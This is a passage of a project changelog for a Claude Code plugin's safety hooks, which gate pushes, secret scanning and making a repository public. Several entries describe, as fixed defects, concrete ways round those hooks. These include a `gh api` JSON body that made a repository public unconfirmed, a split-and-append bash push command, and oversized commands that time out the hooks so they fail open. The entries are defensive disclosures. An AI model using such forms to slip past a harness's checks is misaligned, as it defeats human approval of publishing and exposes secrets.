  `gh api -X PATCH repos/me/app --input - <<< '{"visibility":"public"}'` and
  the piped `echo '{...}' | gh api ... --input -` form were **allowed**, with
  no go-public confirmation at all — defeating "private first, then a separate
  explicit step to go public", which this project treats as settled. The file's
  own comment block had claimed since 2026-07-21 that it covered exactly this
  inline-JSON case; no code ever implemented it. Visibility is now matched in
  JSON form as well as flag form.
- The residual that pattern cannot close: `--input body.json` reads the body
  from a file whose contents are not in the command text, so such a write can
  never be _proven_ private. It now fails closed — but only when aimed at a
  repository root endpoint (`repos/<owner>/<repo>`) or a repo-creation
  endpoint, the only paths whose body can carry visibility at all. ~~A
  sub-resource (`.../issues`, `.../dispatches`, `.../releases`) is untouched,
  so the fix never demands a go-public token for a write that could not change
  visibility anyway.~~
  **Struck 2026-08-16 (finding X189): that sentence was never true.** The
  repository-root test ended in `(?![A-Za-z0-9_])`, a boundary a following `/`
  satisfies, so every sub-resource matched the root and filing an issue was
  refused with a message about going public. Corrected under "Unreleased" at
  the top of this file. It is
  struck rather than deleted because the claim was published and acted on.
- **`scan.mjs`: the small-file gzip path had no decompression cap.** The
  `>MAX_SCAN_BYTES` branch has capped `gunzipSync` at 64 MiB since 2026-07-26;
  its twin — the branch handling a gzip file small enough to read whole — passed
  no cap at all, while its own `catch` comment already claimed "a compression
  bomb guard tripped", describing a guard that did not exist. Reproduced: a
  1 MiB gzip of 1 GiB of zeros made the hook allocate roughly a gigabyte and
  stall about ten seconds on a push it then allowed. Capped to the same
  constant the sibling uses: ~0.3s after the fix, down from ~10s.
  Recorded as a resource-exhaustion and consistency defect, **not** a secret
  bypass — the scan degraded gracefully rather than letting anything through,
  and that severity is stated rather than inflated.
  - Disclosed cost: content inflating beyond 64 MiB from an under-4 MiB archive
    is no longer decompressed and scanned. For such an input that is a 16x
    expansion, far above real text archives (gzip on prose is ~3-4x, on
    logs/JSON ~5-10x) and far below the 1000x+ a bomb needs. A regression test
    pins a secret inside a 32 MiB-inflating archive as still caught.
  - The pre-existing bomb test passed against the uncapped code — a 200 MiB
    inflate is survivable inside its 15s budget — so it never discriminated on
    the cap it named. The new test is sized to fail without the fix.
- **The VS Code extension's only command could never run for anyone who
  installed it.** Its `Status` command prefers a `clients/cli/` sibling
  directory, and `.vscodeignore` guarantees that directory is never inside a
  packaged `.vsix` — so for every Marketplace install the guard failed and the
  command did nothing but show an error saying it only works from a repository
  checkout. The guard was added in July on two premises that have since gone
  stale, both re-checked directly rather than assumed:
  `@gru953/studio-cli` **is** published to npm (5.0.1, 5.1.0, 5.1.1, 5.1.2 —
  confirmed against the registry), and `.github/workflows/publish.yml` **is**
  the publish step whose absence the comment cited. The command now prefers the
  local checkout when there genuinely is one (faster, works offline, what a
  contributor wants) and otherwise falls back to
  `npx --yes @gru953/studio-cli status` — verified end-to-end by running it
  against the published package, not assumed to work. `--yes` so npx cannot
  stall on an interactive install prompt in a terminal the user never typed
  into. A published extension whose only command never runs is the same class
  of defect as 5.0.1's finding 16 (a command wired to a package that does not
  exist), reached from the other direction.
- **The disclosed matcher cost is now bounded, because the open question behind
  it turned out to be "fails open".** `SECURITY.md` had disclosed
  `normalizeForPushCheck`'s superlinear assignment-resolution cost as an
  accepted, adversarial-only residual, leaving open what Claude Code does with a
  `command` hook that exceeds its timeout. The hooks reference answers it: "Any
  other exit code is a non-blocking error… The action proceeds", and a cancelled
  hook exits non-zero — with Agent SDK callbacks singled out as the exception
  that blocks, "because a callback there can be acting as a policy gate that must
  not fail open". So a command crafted to run past the 600-second default
  (roughly 36,000 assignments, ~310 KiB) would have **both** push-time hooks
  cancelled and the push would proceed unscanned and unauthorised. Resolution is
  now skipped past 500 assignments — over 16x the largest real command this
  project has seen — and both callers fail CLOSED there: `isPushCapable` answers
  "push-capable" (routing to the authorisation check), `isGoPublicCommand`
  answers "going public" (still requiring its separate confirmation). The
  5,000-assignment case drops from ~9 s to effectively free; every ordinary
  command is unchanged. Stated precisely: the fail-open behaviour is read from
  the documentation, not reproduced in a live session — the bound is worth having
  either way, since it removes a multi-minute stall regardless.
- **A skill recommended a retired Claude model for its hardest tier.**
  `google-antigravity-integration`'s model-routing table named **Claude 3.7
  Sonnet** for "Complex / Deep Tasks" — a model retired on 2026-02-19, so the
  single hardest tier pointed at an ID that no longer resolves. Checked against
  Anthropic's current model documentation rather than from memory. The Claude
  tiers are now named by family, matching the deliberate version-free convention
  `model-router` already uses — which is precisely why that skill did not rot
  the same way.
  - The Gemini names alongside it (`Gemini 3.6 Flash`, `Gemini Flash High`,
    `Gemini Ultra`) are **not** claimed to have been wrong: they could not be
    verified against Google's current documentation during the audit, and
    swapping an unverifiable name for a guess would repeat the defect. They are
    generalised to tier names, with the uncertainty recorded in the skill.
  - `model-router` cited `google-antigravity-integration` as one of the skills
    that "already apply" its verify-before-relying discipline. It did not carry
    that disclaimer; it does now.
- **The key-file backstop knew only the legacy SSH key name.** `scan.mjs`'s
  filename rule listed `id_rsa` and missed every modern one — `id_ed25519` has
  been ssh-keygen's recommended type since OpenSSH 7.8 (2018). Scoped honestly:
  for an ordinary PEM key this changed nothing, because the content rule catches
  `-----BEGIN … PRIVATE KEY-----` whatever the file is called (verified against
  both an OpenSSH ed25519 key and an EC key before the fix). The gap was the case
  the filename rule exists for — content the regexes cannot see: a DER-encoded
  (binary) key is never content-scanned, and byte-identical files shipped as
  **allow** when named `id_ed25519` while being correctly blocked as `id_rsa`.
  `id_dsa`, `id_ecdsa`, `id_ed25519` and `id_ed448` are now covered. The `$`
  anchor is unchanged and load-bearing: `id_ed25519.pub` is a public key and
  stays clear, exactly as `id_rsa.pub` already did — pinned by a test.
- **A truthful evidence note was blocked as if it were a failure.** 5.1.3
  narrowed `CONTRADICTION_RE`'s bare `regression` noun so it "only counts when
  followed by a failure verb". The lookahead it shipped also accepted bare
  auxiliaries (`was`/`is`/`has`/…), and an auxiliary admits _any_ continuation —
  so the narrowing never applied to the phrasings people actually write.
  Evidence reading `npm test -> exit 0, after an earlier regression was fixed`
  was BLOCKED. That penalises honesty and pushes users toward vaguer evidence,
  which is the opposite of what the gate is for. An auxiliary must now be
  followed by an actual failure participle; genuine claims
  ("regression was spotted", "has been introduced") are still caught.
- **`pending` was the one word the evidence check could not see.**
  `traceability-check.mjs`'s own header promises that "a requirement marked
  met/done must carry a non-placeholder Verification cell" — but `pending`, the
  word this repository's own golden fixture uses for its not-yet-done
  requirements, was absent from `PLACEHOLDER_RE`. Reproduced against that
  fixture: flipping R3 to **met** while leaving its literal `pending`
  verification in place returned `{"status":"clean"}`. `pending` and `tbc` are
  now recognised. This revises a documented decision rather than contradicting
  it silently: that note argued the shared pattern and `content-check.mjs`'s
  wider one should not be _unified_ — they still are not — but it never
  addressed whether `pending` counts as evidence, and "met with verification
  pending" is self-contradictory by construction. Both additions are whole-cell
  only, so prose containing the word is unaffected.
- Released as 5.1.4 rather than re-using 5.1.3: the `v5.1.3` tag published
  nothing (see below), so a fresh version is clearer than a re-pointed tag.

Test suite: 410 → 416 tests. Each failure-mode test was confirmed to fail
against the pre-fix code and pass after it; every must-still-tolerate inverse
passes both ways, as a control should.

## 5.1.3 — 2026-08-06

A further-pass audit of the publish-safety hooks, in the repo's own "reproduce
by execution before you call it a bug" discipline. Every finding below was
reproduced against the pre-fix code and confirmed fixed the same way; each fix
carries a regression test in `hooks.test.mjs` (391 → 404 tests, all green, and
all six CI gates stay green).

- `verify-progress.mjs`: a done row reading `verified: npm test → NOT exit 0`
  was accepted clean — VERIFIED_RE's `.*` swallowed the negation, and
  CONTRADICTION_RE only looks for non-zero exits. The `verified: … → exit 0`
  form now refuses a `not`/`never` between the arrow and the exit code.
- `lib.mjs` `CONTRADICTION_RE`: three hardening changes. (1) A bare present
  failure "the current build fails" (no now/still/currently adverb) never
  matched, so a done row honestly saying its build currently fails still
  passed — added `current(?:ly)? <noun?> fails?`. (2) The pattern now ignores
  a contradiction phrase that is itself negated ("not currently failing",
  "the suite never fails", "no exit code 1" are positive claims and stay
  clean). (3) `regress(?:ed|ion)` matched the bare noun anywhere, so a row or
  task legitimately named "Regression tests" was wrongly BLOCKED; the noun
  form now only counts when followed by a failure verb ("regression was
  spotted/found/…").
- `quality-gate.mjs` and `traceability-check.mjs`: CONTRADICTION_RE ran
  against the whole raw row, so a label word could trip the gate; both now
  scope the contradiction check to the evidence / verification cell, where a
  contradiction claim actually lives.
- `content-check.mjs`: `TEXT_ONLY_RE`'s `text\b` matched a hyphenated media
  type — "text-to-speech audio" was treated as text and silently skipped the
  alt-text/transcript requirement. The pattern now rejects a dash or a spaced
  "to" right after the text token, so a TTS audio asset correctly needs a
  transcript.
- `docs-consistency.mjs`: the historical-section range offsets were computed
  with a flat "+1 for the split-away newline", drifting one byte short per
  line on a CRLF checkout — after enough CRLF lines a live wrong count placed
  just before a `## vX.Y.Z` section was mis-classified as historical and
  skipped (same fixture BLOCKS on LF, clean on CRLF). Offsets now come from
  the raw text's real newline positions.
- `repo-integrity.mjs`: (1) INV10 — a single-sided wrapper like
  `(Bash|PowerShell|Monitor` (stray "(", no closing ")") still named all three
  tools after stripping, so a malformed matcher reported the publish-safety
  hooks covered; unbalanced wrappers now contribute no alternatives and fail
  closed. (2) INV15 — `checkHostRuleFiles()` had only a `finally`, so a throw
  from the host-rules generator crashed with a raw stack trace and no JSON at
  all; it is now caught and surfaced as one ordinary BLOCKED problem.
- `licence-scan.mjs`: `mergeNodeFindings()` returned the node_modules result
  whenever the lockfile scan was unchecked, discarding its "Failed to parse
  lockfile" note — a corrupt package-lock.json next to a real node_modules
  reported CLEAN while the same corrupt lockfile without node_modules was
  honestly INCOMPLETE. node_modules (an install artefact, often absent or
  stale) can no longer paper over a lockfile we failed to read: the merged
  result stays notChecked → INCOMPLETE.
- `dashboard.mjs`: a decorated `**Status**` header or `**done**` value made
  the board group every row into "other" (statusIdx -1 / groupOf fallback) —
  the same value-cell gap the sibling gates already close. Both are
  de-emphasised before classifying, so the row CSS class and count pills match
  what a reader sees.

Also in 5.1.3, found by auditing the release itself rather than trusting it
(the same discipline that found 5.1.1's publisher bug):

- **The 5.1.3 tag published nothing, and said nothing was wrong.** The
  `v5.1.3` tag was pushed while every version number in the repository still
  read 5.1.2 — and `.claude-plugin/marketplace.json` and the plugin's own
  `plugin.json` still read 5.1.1, never bumped by the 5.1.2 release at all.
  `publish.yml` reads the version from `package.json`, not from the tag, so
  all three publish jobs saw a version already live, took their "already
  published — skip cleanly" path (added in 5.1.2 for re-signed tags), and
  reported a green run. Every version number now reads 5.1.3.
- `publish.yml` now fails immediately if the tag being published and the
  package's own version disagree, in each of the three jobs. A tag is a
  statement of intent; a silent skip is the wrong answer when it turns out
  to be wrong.
- `docs-consistency.mjs` gains DC9: every version stated in the plugin
  manifest, the marketplace manifest, the three client packages, and
  README's "Latest version" line must agree with `CHANGELOG.md`'s newest
  release heading. Reproduced against the pre-fix repository (BLOCKED,
  naming the exact stale manifest) and confirmed clean after the bump.
- `docs-consistency.mjs`: `AUDIT-2026-08.md` was not exempt from the
  stale-count check, though `AUDIT-2026-07.md` was — a dated findings
  register quotes its own then-current counts as evidence, and the newer one
  read clean only because those numbers still matched. Any root-level
  `AUDIT-<date>.md` is now exempt by shape rather than by filename.

Test suite: 404 → 410 tests, all green, all six CI gates green.

## 5.1.2 — 2026-08-01

A branding-consistency and reliability release — no behaviour change to how
the studio itself works.

- The VS Code extension had no icon at all. It now ships the official
  Soaring Bird mark (`clients/vscode/icon.png`, 1024×1024, from
  `docs/brand/`), wired in via `package.json`'s new `icon` field. The same
  mark was also added to the project wiki (`Home.md`, the sidebar), and a
  1280×640 image was prepared for the repository's GitHub social-preview
  setting (that setting has no public API, so it still needs a one-time
  manual upload — see the repo's Settings → General → Social preview).
- The phrase "Universal Agentic Studio" — an old marketing tagline — had
  crept into the product's own displayed _name_ rather than staying
  descriptive text: the VS Code extension's Marketplace listing
  (`displayName`) and command title, the CLI's and Google Antigravity
  bridge's own startup/status console output, and the plugin marketplace
  descriptions. All of it now says "GRU953-Studio" — the one name this
  project's own `governance/TRADEMARKS.md` names as correct — wherever it
  stands in as the product's name. Descriptive prose (README, the
  `universal-platform-integration` skill) was trimmed rather than rewritten
  to keep saying the same thing without the phrase.
- `.github/workflows/publish.yml` failed loudly the one time a v5.1.1 tag
  was deleted and recreated (to add a GPG signature after the fact — see
  the git history): the recreated tag re-triggered the workflow, which
  tried to republish a version already live on npm and the Marketplace, and
  every job failed with "already exists". The real packages were always
  fine; only the workflow run showed red. Each job now checks first and
  skips cleanly instead of failing when its version is already published —
  so recreating a tag (for signing, or any other reason) can never produce
  a false failure like this again.

## 5.1.1 — 2026-08-01

One fix, found by checking 5.1.0's own release rather than trusting it.

- `clients/vscode/package.json`'s `publisher` field still said `GRU-953`
  (the GitHub account handle) rather than `GRU953` (the actual registered
  VS Code Marketplace publisher — a distinction this project's own
  trademark rules already draw). The 5.1.0 release's automated publish
  step reported success — "Published GRU-953.gru953-studio v5.1.0" — but
  no such publisher exists on the Marketplace, and nothing ever actually
  appeared there under either name. Independently checked directly against
  the Marketplace (not the tool's own report) before concluding this;
  confirmed fixed the same way afterwards. The npm packages published
  correctly in 5.1.0 and are unaffected.

## 5.1.0 — 2026-08-01

The first release built from a real, end-to-end functional test — not a
static read of the code. A minor version, not a patch: the publishing
pipeline below is new functionality, even though most of this release is
bug fixes.

**The studio was watched building two real projects from scratch**, for the
first time ever: a Tiny-Tier command-line tool and a Standard-Tier app,
including a genuinely blind, cold-restart resume test (a fresh agent, given
only a file path and no other context, correctly picked up exactly where
work had stopped). This found real defects — most were caught immediately;
a few were only caught by a third review pass specifically attacking the
first round's own fixes, which is exactly why that discipline exists.

- **Two of the studio's own push-safety checks could be silently bypassed**
  by an ordinary timing race: if a hook's process started reading its input
  before its caller had finished writing it, the read could return a
  silently truncated message that looked like a normal, valid "no command"
  read. `scan.mjs` (the secret scanner) and `gate.mjs` (the publish/go-public
  confirmation gate) both now retry a genuinely interrupted read by
  accumulating what was already received, and refuse to proceed at all
  rather than guess, if a read still can't be completed.
- `scan.mjs`'s file scan went blind to secrets outside the current
  directory when a push command ran from a subdirectory of a project —
  found once, and the fix for it introduced a narrower version of the exact
  same gap in a different call site, found by a later review pass and
  fixed properly this time.
- A new check: `Dev-Memory/` — a project's private working notes, which
  this project's own rules say must never be shared — is now mechanically
  blocked from being pushed if it isn't excluded by `.gitignore`. Previously
  nothing checked this at all; it was a rule with no enforcement.
- Tiny-Tier projects no longer need a `REQUIREMENTS.md` file they were never
  supposed to need — `traceability-check.mjs` now reads a project's
  recorded Tier (a new, exact `**Tier:** Tiny`/`Standard`/`Complex` line in
  `OBJECTIVE.md`) and only relaxes for a genuinely unambiguous Tiny. Two
  follow-up rounds closed real gaps in that same fix: a struck-through or
  multi-word Tier value could switch the check off, and a Tier line shown
  only as an example inside a code block was being read as the real one.
- The bold-text tolerance from 5.0.1 didn't reach every form of decoration —
  a placeholder written as `~~tbd~~`, `<b>tbd</b>`, or `"tbd"` still slipped
  past four gates. Closed, the same way 5.0.1 closed it for `**tbd**`.
- The two npm command-line packages (`@gru953/studio-cli`,
  `@gru953/studio-antigravity`) **are now genuinely published on npm** —
  this file and the README have advertised them for months, but neither
  had ever actually been shipped. A new release pipeline
  (`.github/workflows/publish.yml`) publishes both, plus the VS Code
  extension to its Marketplace, whenever a version tag is pushed — each of
  the three publish steps needs its own separate human approval before it
  runs, using npm's Trusted Publishing so no long-lived npm token is ever
  stored as a secret.
- `clients/antigravity` had no real way to be installed or run as a
  package (no `bin`, no `files` field). Fixed, and given a README stating
  plainly that — like the CLI — it currently only works from inside a full
  checkout, not as a standalone install, since it needs the rest of this
  repo's own files to function.
- Node 20 reached its own end of life in April 2026 and was still being
  tested against; dropped, and the project's own default moved to Node 24.
  Two GitHub Actions pins were a version behind or mislabelled; corrected.
- A handful of smaller fixes: a missing dependency manifest and
  `.gitignore` convention for new Python projects; a caveat that Swift's
  tests need the full Xcode app, not just Command Line Tools; a lint gap
  that meant two client packages' own source was never actually checked in
  CI; small consistency and documentation fixes throughout.
- **One target not met, recorded honestly rather than quietly dropped:** the
  test suite's own speed was measured at ~51 seconds against a 33-second
  goal. The real cause — nearly 400 tests, most launching a separate small
  program — would need rewriting the whole suite to fix, which is out of
  proportion to a speed goal for safety-critical test coverage. Measured
  and recorded; not forced.

## 5.0.1 — 2026-07-30

Bug fixes only — no roster, Tier, or workflow changes. This release is also
the first time 5.0.0's own changes (below) reach a published GitHub
Release — 5.0.0 was merged to `main` on 2026-07-26 but never tagged or
released, so this release covers both.

- The VS Code extension's Status command ran `npx @gru953/studio-cli
status`, but `@gru953/studio-cli` has never actually been published to
  npm and there is no publish step anywhere in this repo, so that command
  could never have worked. It now runs the CLI's own entry file directly
  (`node .../clients/cli/src/index.js`) when the extension is running from
  inside a full GRU953-Studio checkout, and otherwise shows a plain error
  explaining that the command needs one, instead of crashing the
  integrated terminal with a raw "Cannot find module" stack trace.
- Every generated AI-host rule file (`.cursorrules`, `.clinerules`,
  `.windsurfrules`, `.roomodes`, `.github/copilot-instructions.md`,
  `.agents/AGENTS.md`) told users to run the same never-published `npx
@gru953/studio-cli`. All now point at the real, working `node
<checkout>/clients/cli/src/index.js` command instead.
- Five of a project's own gates — `quality-gate.mjs`, `content-check.mjs`,
  `traceability-check.mjs` and `memory-integrity.mjs` — read markdown
  tables and previously only tolerated **bold** column headers, not bold
  values underneath them. A bolded status like `**pass**` or `**n/a**` is
  now correctly recognised (it used to be wrongly BLOCKED); a bolded
  placeholder like `**tbd**` in an evidence, verification, or reason cell
  is now correctly still rejected (it used to be wrongly waved through as
  real proof). `memory-integrity.mjs` additionally now correctly recognises
  a bolded existing file path (e.g. `**src/real.js**`) instead of wrongly
  reporting it as missing. One behaviour change worth knowing about
  directly: `memory-integrity.mjs` now BLOCKS (rather than silently
  passing) any table in `INDEX.md` whose header row has no recognisable
  file/path/where/location column at all — previously that case was
  skipped without comment.

## 5.0.0 — 2026-07-26

A **major hardening release**, the result of an eight-stage, exhaustive audit
of the whole repository (the full, reproducible findings register is
committed as [AUDIT-2026-07.md](AUDIT-2026-07.md)). Major, not a smaller
release, for three reasons: the checks below are measurably stricter, so a
project that passed its gates on 4.5.0 could fail on 5.0.0 without its owner
changing a line of their own code; some published surface is removed or
renamed; and two things this document already describes elsewhere — the
knowledge-graph's link vocabulary, and what every language pack must
declare — change their exact shape.

**The checks themselves got more honest.** Before this release, several of
the plugin's own safety and quality checks could report "all clear" without
really having looked:

- The "is this task really done?" check no longer accepts a failing test
  run as proof that it passed.
- The dependency-licence scanner now actually looks. It used to check only
  the very top folder of a project — which meant it reported "no
  dependencies found" on this very repository, even though four real
  manifests and ninety-three installed packages were sitting one folder
  down. It now finds every real manifest anywhere in the project, and
  correctly recognises a package licensed under an either/or choice (like
  "MIT or CC0") as fine when either option is.
- A new check, `docs-consistency.mjs`, catches a stale number quoted in two
  places that disagree, the same item listed twice by mistake, and a named
  specialist that doesn't actually exist on the team — the exact kind of
  mistake that let two made-up role names sit in this project's own
  documentation until this audit found them.
- Secrets hidden inside a compressed or unusually-encoded file are scanned
  again (a bug had quietly turned this check off); a content-rights check
  no longer treats a file it can't read as if it were simply absent.

**Removed the one thing that could touch your files without asking.**
Starting a session used to silently run a background command that could
fetch, rebase and stash uncommitted work in the plugin's own folder, with no
confirmation. It now only tells you an update may be available — running
`/studio-update` still performs a real update, but only when you ask for it.

**Proven to work the same on Windows, macOS and Linux**, not just Linux —
including a bug that used to make a Windows checkout report all thirty-eight
specialist roles and all thirty-five skills as broken, simply because of how
Windows writes line endings.

**Every "runs on every platform" promise is now real, not aspirational.**

- The studio now actually asks which platform you want your app on, as one
  of its very first questions.
- The skill that maps your answer onto real build instructions for every
  platform — present since 4.5.0, but never once loaded — now loads like
  every other one.
- Every language specialist's toolkit now names the real command that
  produces a finished, installable app (an `.apk`, an `.ipa`, an `.exe`, a
  live web address) — previously they all stopped at "compiles".
- Two specialists named in the platform map, `react-native-developer` and
  `tauri-developer`, never actually existed. Both frameworks now correctly
  point at the language specialists who already cover them. The team stays
  at thirty-eight roles.
- The command-line tool, the VS Code extension, and the Google Antigravity
  bridge each had at least one command that was broken or did nothing.
  Every one now does what it claims, or has been removed rather than left
  pretending to work.

**Packaging clean-up.**

- Removed a bundled, experimental protocol server that had never
  successfully started since it was added, and was the one thing making
  "zero third-party code dependencies" untrue.
- Corrected wrong licence labels on the command-line tool, the Google
  Antigravity bridge and the VS Code extension; added the licence,
  repository link and readme the VS Code extension needed to actually be
  publishable; renamed the Google Antigravity bridge's package to
  `@gru953/studio-antigravity`, matching the other two.

No change to how you use the tool day to day — the interview, the pop-up
questions, and the lifecycle stay the same. See AUDIT-2026-07.md for every
individual finding, with the exact file and line it was found at.

## 4.5.0 — 2026-07-26

A **feature release** taking GRU953-Studio beyond a Claude Code plugin, deployable across all major 2026 AI coding platforms (Cursor, Windsurf, Copilot, Devin, Replit, Aider, OpenHands, Cline, Augment Code, Tabnine, JetBrains AI).

**Universal Platform Support:**

- Added `skills/universal-platform-integration/SKILL.md` (the 34th skill), establishing the Universal Agentic Protocol.
- Mapped the studio's 38 specialized roles, 34 skills, and token-cheap memory graph system (`Dev-Memory`) to IDE-native rules (`.cursorrules`, `.windsurfrules`), CLI dispatch (Aider), autonomous sandboxes (Devin, OpenHands), and enterprise swarms (Augment Code, Tabnine).
- Shifted the positioning in README.md, ROSTER.md, plugin.json, and marketplace.json to reflect universal support.
- Updated repository integrity checks and baseline expectations to account for the new skill count (34 skills).

## 4.4.0 — 2026-07-26

A **feature & quality release** introducing native support for **Google Antigravity**
(Google Antigravity SDK and Gemini Antigravity IDE) alongside Claude Code,
incorporating dynamic Gemini model routing, expanding the skill set to 33 skills with
`google-antigravity-integration`, and applying multi-loop SME safety and quality hardening.

**Google Antigravity & Multi-Platform Support:**

- Added `skills/google-antigravity-integration/SKILL.md` establishing the protocol for
  running GRU953-Studio on Google Antigravity (AGY SDK & Gemini Antigravity IDE).
- Updated `model-router` to support Gemini models (Gemini 3.6 Flash, Gemini 2.5 Pro/Flash,
  Gemini Ultra) alongside Claude model tiers (Haiku, Sonnet, Opus, Fable).
- Updated `dev-memory`, `first-run`, `studio`, `cost-guard`, `gemini-integration`, and `session-start.mjs`
  for seamless dual-platform memory layout (`Dev-Memory/` and `.agents/`), token usage
  tracking, and environment auto-detection.
- Updated agent roles (`project-lead`, `ai-developer`, `memory-keeper`, `researcher`,
  `security-compliance-auditor`, `devops-engineer`) to support multi-platform dispatching and
  Google Antigravity SDK (`google-antigravity`) usage.

**SME Audit & Quality Hardening:**

- Verified all 12 structural invariants in `repo-integrity.mjs` across agents, skills, hooks, and manifests.
- Expanded `hooks.test.mjs` test suite to cover Google Antigravity integration, skill resolution, and edge-case handling.
- Kept baseline agent count at 38 roles and expanded skill count to 33 skills.

## 4.3.0 — 2026-07-21

A **quality-and-hardening release** from a deep, multi-round independent audit
(each finding double-checked against the real code before it was trusted). It fixes
real bugs — including two security-gate gaps — and adds many tests. No change to how
you use the tool; the roster stays 38 agents / 32 skills.

**Security fixes:**

- Closed a way to bypass the publish / go-public safety gate using GitHub's
  `gh api` command — in both its spaced (`-f name=x`) and attached (`-fname=x`)
  forms, and including repo creation that defaults to public. Ordinary reads (e.g.
  `gh api user`) are unaffected.
- Removed a "slow regex" flaw where certain long commands could freeze the safety
  check for many seconds; it is now effectively instant.
- The secret scan now also checks the git history a push would ship (not just the
  current files), including by key-file and private-folder name.
- The secret scan no longer skips a whole file just because it contains one stray
  non-text byte. An ordinary text file — say a log or a database export — that
  happens to include such a byte next to a real password or key is now still
  checked, on both the current files and the history a push would ship. Genuine
  picture, font and other binary files are still skipped (they don't hold
  typed-in secrets), and non-English text such as Bangla is treated as text.
- Closed a gap where creating an **"internal"** repository (one visible to a whole
  organisation, so not really private) could slip past the "make it public" safety
  check on an ordinary private-scope confirmation. It now needs the same explicit
  go-public approval as making a repository fully public.
- The secret scan now also checks **large** files (previously any file over 4 MB
  was skipped without being looked at) — so a plaintext key in a big text file
  like a Terraform state file, database dump or verbose log is caught. Large
  genuine picture/video/binary files are still skipped. It also now catches a
  secret sitting on the same line as a stray non-text byte in the git history,
  matching how the current-files check already behaved.
- Closed a gap where a secret in a file you'd told Git to ignore could still ship
  if it was force-added, committed and pushed all in one command — those
  force-added files are now checked too, while an ordinary push still leaves your
  ignored files alone.
- The history check now also looks inside **merge** commits, so a secret pasted in
  while resolving a merge conflict (and later removed) can't slip through.
- The force-add check now understands filenames with spaces (e.g. a file named
  "prod copy.secret"), and the history check now covers **every** local branch you
  might push — including `git push --all`, `git push --mirror`, or pushing a branch
  you're not currently on — not just the one you have checked out.
- The secret scan now also reads **commit messages** and **annotated-tag messages**
  (when you push tags), catching a key accidentally pasted into a commit or release
  message — a very common way secrets leak — not just keys inside files.

**Correctness & reliability:**

- The licence check no longer false-blocks publishing on ordinary npm/TypeScript
  projects (it stopped treating npm's `.bin`/`.cache` tooling folders as packages).
- Fixed false "all clear" and false "blocked" results in several internal checks
  (indented progress tables, a content manifest followed by a second table,
  knowledge-graph links with trailing notes, and roster-count parsing).
- The automatic AI model chooser had the most expensive model (Fable) mislabelled
  as a cheap one, so cheap work was routed to the priciest model; corrected, with a
  context-window rule added.
- Reconciled the publish checklist to its full seven blocking checks across every
  file that describes it (with a mechanical guard so it can't drift again), added
  the "treat data as data" guardrail to the one role that lacked it, hardened the
  AI prompt-injection and Gemini key-handling guidance, and fixed the dashboard's
  colour contrast (light and dark) to meet accessibility standards.
- The check that "every finished task shows proof it was tested" no longer quietly
  passes when the progress table's status column is written in an unusual but valid
  way (in **bold**, under a synonym like "State", or in a table without outer
  borders). It now recognises those, and if it genuinely can't tell which column
  is the status, it stops and asks rather than waving the work through. It also now
  reads a "done" written with decoration (bold, code-style, or with a tick emoji)
  and lines up table columns even when rows mix pipe styles, so a finished-but-
  untested task can't slip through on a formatting quirk. The matching requirements
  check now recognises a decorated "met" status the same way, so it can't skip its
  proof-of-testing requirement either.

**Under the hood:**

- The automated test suite was grown substantially, with new mechanical guards so
  each fix above cannot silently regress; all five safety checks stay green.

## 4.2.0 — 2026-07-21

A **documentation and packaging release**. The whole GitHub repository was
rebuilt to be clearer, more consistent, and easier for non-technical people to
use — front to back. There are **no changes to how the tool behaves**: the roster
stays at 38 agents / 32 skills, and no agent, skill, hook or safety gate was
altered.

**The wiki is now the main guide.** A new, plain-English
[GitHub Wiki](https://github.com/GRU-953/GRU953-Studio/wiki) is the primary
handbook — installing on every platform, connecting Ollama, connecting Gemini,
the full team of specialists, all the skills, features, sample use cases,
troubleshooting, an FAQ, and a sponsorship page. Each page was independently
checked for accuracy and plain-English clarity.

**The website is now a focused landing page.** The
[website](https://gru-953.github.io/GRU953-Studio/) keeps its polished landing
page and points to the wiki for depth; the old deep pages now redirect there, so
no existing links break. Two brand-compliance fixes: the brand fonts are now
**self-hosted** (previously loaded from a third-party font service, which the
brand guidelines don't allow, and which also sent visitors' details to that
service), and the colours were aligned to the official GRU953 "Open Spectrum"
palette in both light and dark themes.

**The licence file is now the exact, official text.** `LICENSE` now contains the
verbatim, canonical PolyForm Noncommercial 1.0.0 text. The commercial-licensing
terms moved to a dedicated, friendly [COMMERCIAL-LICENCE.md](COMMERCIAL-LICENCE.md),
and [NOTICE](NOTICE) now explains honestly that GitHub may still label the licence
"Other" — because PolyForm isn't in GitHub's built-in licence catalogue, a display
limit on GitHub's side, not a fault in the file.

**Sponsorship and support.** A new "Sponsor" button (`.github/FUNDING.yml`) links
to a plain-English [Sponsorship](https://github.com/GRU-953/GRU953-Studio/wiki/Sponsorship)
page covering how to support the project or arrange a commercial licence. A new
[SUPPORT.md](SUPPORT.md) points people to the right place for help.

**Community files, tidied for newcomers.** The README was rebuilt as a clear
front page. `SECURITY.md` gained a stronger plain-English opening (with a clear
"non-technical users need only the first part" signpost) and a currency note
bringing it up to date — with none of its honest technical detail removed. The
bug-report and feature-request forms are now guided, labelled forms that are
easier to fill in, with a helpful chooser linking to Discussions, the guide and
the security policy.

**Repository housekeeping.** A stale, already-merged working branch was removed,
and the repository's "About" details, topics and description were reviewed.

## 4.1.1 — 2026-07-19

A hardening, documentation and website pass over 4.1.0 — no new agents or
skills (roster stays at 38 agents / 32 skills); every change below is a bug
fix, a clarity improvement, or new documentation/website content.

**Real bugs fixed, found by a deep multi-lens audit (with adversarial
verification against the live code, not just review):**

- `traceability-check.mjs` — a composite task id like `P1-T3` was silently
  split into two separate ids (`P1`, `T3`); an unrelated bare `T3` elsewhere
  could then collide with and overwrite the composite's entry, hiding real
  scope creep from the reverse (untraced-task) check. Now matched as one
  token.
- `hooks/lib.mjs` — bash's scalar append-assignment (`NAME+=value`) was not
  resolved at all, so a push or go-public command built up this way (e.g.
  `p=pu; p+=sh; git $p origin main`) bypassed both the push gate and the
  private/public separation guarantee. Now resolved like every other
  assignment form.
- `content-check.mjs` — the media/alt-text check matched only English
  keywords (image/audio/video/…), so a `CONTENT.md` row written in Bangla
  (e.g. `ছবি` for "image") silently skipped the mandatory alt-text check.
  Inverted to fail closed: alt-text is required unless a row is explicitly,
  recognisably marked TEXT (English or Bangla).
- `memory-integrity.mjs` — node/link ids and "does this look like a real
  path" checks were ASCII-only, so a punctuated id (`T1.a`), a Bangla node
  id, a bare non-ASCII filename, or a markdown-link-formatted `INDEX.md` cell
  were silently skipped from validation even when genuinely dangling/stale.
- `quality-gate.mjs` — the Definition-of-Done table parser swept rows from
  _every_ Item+Status-shaped table in the file, so an unrelated later table
  (e.g. a backlog list) could leak a spurious row into a required
  dimension's matching. Now reads only the first, intended table.
- `session-start.mjs` — an ephemeral-environment env-var check treated any
